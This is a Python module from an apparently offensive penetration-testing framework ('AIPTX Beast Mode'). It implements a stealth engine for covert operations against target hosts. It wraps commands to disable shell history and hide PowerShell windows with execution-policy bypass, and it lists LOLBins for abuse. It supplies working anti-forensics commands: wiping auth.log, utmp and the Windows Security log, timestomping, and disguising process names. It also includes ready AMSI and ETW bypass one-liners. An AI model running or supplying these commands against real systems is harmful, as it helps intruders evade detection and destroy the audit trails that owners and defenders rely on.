"""
AIPTX Beast Mode - Stealth Engine
=================================

Main coordinator for stealthy operations.
"""

from __future__ import annotations

import logging
import random
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable

logger = logging.getLogger(__name__)


class StealthLevel(str, Enum):
    """Stealth operation levels."""
    NONE = "none"       # No stealth, maximum speed
    LOW = "low"         # Minimal stealth
    MEDIUM = "medium"   # Balanced stealth/speed
    HIGH = "high"       # Maximum stealth, slow
    PARANOID = "paranoid"  # Extreme stealth


@dataclass
class StealthConfig:
    """Configuration for stealthy operations."""
    level: StealthLevel = StealthLevel.MEDIUM
    min_delay: float = 0.5
    max_delay: float = 3.0
    jitter_percentage: float = 0.3
    use_lolbins: bool = True
    avoid_known_signatures: bool = True
    randomize_user_agent: bool = True
    fragment_payloads: bool = False
    encode_traffic: bool = True
    mimick_normal_traffic: bool = True
    options: dict[str, Any] = field(default_factory=dict)

    @classmethod
    def from_level(cls, level: StealthLevel) -> "StealthConfig":
        """Create config from stealth level."""
        configs = {
            StealthLevel.NONE: cls(
                level=level,
                min_delay=0,
                max_delay=0,
                jitter_percentage=0,
                use_lolbins=False,
                avoid_known_signatures=False,
                mimick_normal_traffic=False,
            ),
            StealthLevel.LOW: cls(
                level=level,
                min_delay=0.1,
                max_delay=0.5,
                jitter_percentage=0.1,
            ),
            StealthLevel.MEDIUM: cls(
                level=level,
                min_delay=0.5,
                max_delay=2.0,
                jitter_percentage=0.3,
            ),
            StealthLevel.HIGH: cls(
                level=level,
                min_delay=2.0,
                max_delay=5.0,
                jitter_percentage=0.5,
                fragment_payloads=True,
            ),
            StealthLevel.PARANOID: cls(
                level=level,
                min_delay=5.0,
                max_delay=30.0,
                jitter_percentage=0.7,
                fragment_payloads=True,
                encode_traffic=True,
            ),
        }
        return configs.get(level, configs[StealthLevel.MEDIUM])


class StealthEngine:
    """
    Coordinate stealthy operations.

    Provides timing control, command transformation,
    and detection avoidance capabilities.
    """

    def __init__(self, config: StealthConfig | None = None):
        """
        Initialize stealth engine.

        Args:
            config: Stealth configuration
        """
        self.config = config or StealthConfig()
        self._operation_count = 0
        self._last_operation_time = 0.0

    def get_delay(self) -> float:
        """
        Calculate next operation delay with jitter.

        Returns:
            Delay in seconds
        """
        if self.config.level == StealthLevel.NONE:
            return 0

        base_delay = random.uniform(
            self.config.min_delay,
            self.config.max_delay
        )

        # Add jitter
        jitter = base_delay * self.config.jitter_percentage
        delay = base_delay + random.uniform(-jitter, jitter)

        return max(0, delay)

    def wait(self):
        """Wait for the calculated delay."""
        delay = self.get_delay()
        if delay > 0:
            time.sleep(delay)
            logger.debug(f"Stealth delay: {delay:.2f}s")

    def wrap_command(self, command: str, os_type: str = "linux") -> str:
        """
        Wrap command with stealth modifications.

        Args:
            command: Original command
            os_type: Target OS type

        Returns:
            Modified command
        """
        if self.config.level == StealthLevel.NONE:
            return command

        if os_type == "linux":
            return self._wrap_linux_command(command)
        elif os_type == "windows":
            return self._wrap_windows_command(command)
        return command

    def _wrap_linux_command(self, command: str) -> str:
        """Apply Linux-specific stealth wrapping."""
        modifications = []

        # Disable history
        if self.config.level in (StealthLevel.HIGH, StealthLevel.PARANOID):
            command = f"unset HISTFILE; {command}"
            modifications.append("history_disabled")

        # Add to background
        if self.config.level == StealthLevel.PARANOID:
            command = f"nohup sh -c '{command}' &>/dev/null &"
            modifications.append("backgrounded")

        return command

    def _wrap_windows_command(self, command: str) -> str:
        """Apply Windows-specific stealth wrapping."""
        # PowerShell bypass
        if "powershell" in command.lower():
            if self.config.level in (StealthLevel.HIGH, StealthLevel.PARANOID):
                command = command.replace(
                    "powershell",
                    "powershell -WindowStyle Hidden -ExecutionPolicy Bypass"
                )

        return command

    def get_evasion_techniques(self) -> list[dict[str, str]]:
        """
        Get list of applicable evasion techniques.

        Returns:
            List of evasion techniques
        """
        techniques = []

        if self.config.level == StealthLevel.NONE:
            return techniques

        # Basic evasion
        techniques.extend([
            {
                "name": "timing_jitter",
                "description": "Random delays between operations",
                "config": f"delay: {self.config.min_delay}-{self.config.max_delay}s",
            },
        ])

        if self.config.use_lolbins:
            techniques.append({
                "name": "lolbin_substitution",
                "description": "Use built-in OS tools instead of custom binaries",
                "examples": "certutil, bitsadmin, mshta",
            })

        if self.config.avoid_known_signatures:
            techniques.append({
                "name": "signature_avoidance",
                "description": "Avoid known malware/tool signatures",
                "examples": "Obfuscate strings, modify headers",
            })

        if self.config.randomize_user_agent:
            techniques.append({
                "name": "user_agent_rotation",
                "description": "Randomize HTTP User-Agent headers",
            })

        if self.config.fragment_payloads:
            techniques.append({
                "name": "payload_fragmentation",
                "description": "Split payloads across multiple requests",
            })

        if self.config.encode_traffic:
            techniques.append({
                "name": "traffic_encoding",
                "description": "Encode/encrypt traffic to avoid inspection",
            })

        if self.config.mimick_normal_traffic:
            techniques.append({
                "name": "traffic_mimicry",
                "description": "Blend with normal application traffic",
            })

        return techniques

    def get_detection_avoidance_commands(self, os_type: str = "linux") -> list[dict[str, str]]:
        """
        Get commands for detection avoidance.

        Args:
            os_type: Target OS

        Returns:
            List of avoidance commands
        """
        if os_type == "linux":
            return [
                {
                    "name": "disable_history",
                    "command": "unset HISTFILE HISTSIZE HISTFILESIZE",
                    "description": "Disable bash history",
                },
                {
                    "name": "clear_history",
                    "command": "history -c && history -w",
                    "description": "Clear bash history",
                },
                {
                    "name": "timestomp",
                    "command": "touch -r /etc/passwd <file>",
                    "description": "Match file timestamp to reference",
                },
                {
                    "name": "hide_process",
                    "command": "exec -a '[kworker/0:0]' <command>",
                    "description": "Disguise process name",
                },
                {
                    "name": "clear_logs",
                    "command": "echo '' > /var/log/auth.log",
                    "description": "Clear auth logs (requires root)",
                },
                {
                    "name": "utmp_clear",
                    "command": "echo '' > /var/run/utmp",
                    "description": "Clear login records",
                },
            ]
        else:
            return [
                {
                    "name": "disable_history",
                    "command": "Set-PSReadlineOption -HistorySaveStyle SaveNothing",
                    "description": "Disable PowerShell history",
                },
                {
                    "name": "clear_logs",
                    "command": "wevtutil cl Security",
                    "description": "Clear security event log",
                },
                {
                    "name": "timestomp",
                    "command": "(Get-Item <file>).LastWriteTime = (Get-Item C:\\Windows\\System32\\cmd.exe).LastWriteTime",
                    "description": "Match file timestamp",
                },
                {
                    "name": "amsi_bypass",
                    "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
                    "description": "Bypass AMSI",
                },
                {
                    "name": "etw_bypass",
                    "command": "[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)",
                    "description": "Bypass ETW tracing",
                },
            ]

    def get_traffic_blending_config(self) -> dict[str, Any]:
        """Get configuration for traffic blending."""
        return {
            "user_agents": [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            ],
            "request_headers": {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "max-age=0",
            },
            "timing_patterns": {
                "business_hours": {"start": 9, "end": 17},
                "peak_activity": {"start": 10, "end": 15},
                "request_rate": "1-5 per minute",
            },
        }

    def should_continue(self) -> bool:
        """
        Check if operations should continue based on stealth parameters.

        Returns:
            True if safe to continue
        """
        self._operation_count += 1

        # Rate limiting for paranoid mode
        if self.config.level == StealthLevel.PARANOID:
            if self._operation_count > 100:
                logger.warning("Paranoid mode: operation limit reached")
                return False

        return True


def get_stealth_config(level: str = "medium") -> StealthConfig:
    """Convenience function to get stealth configuration."""
    return StealthConfig.from_level(StealthLevel(level))


__all__ = [
    "StealthLevel",
    "StealthConfig",
    "StealthEngine",
    "get_stealth_config",
]
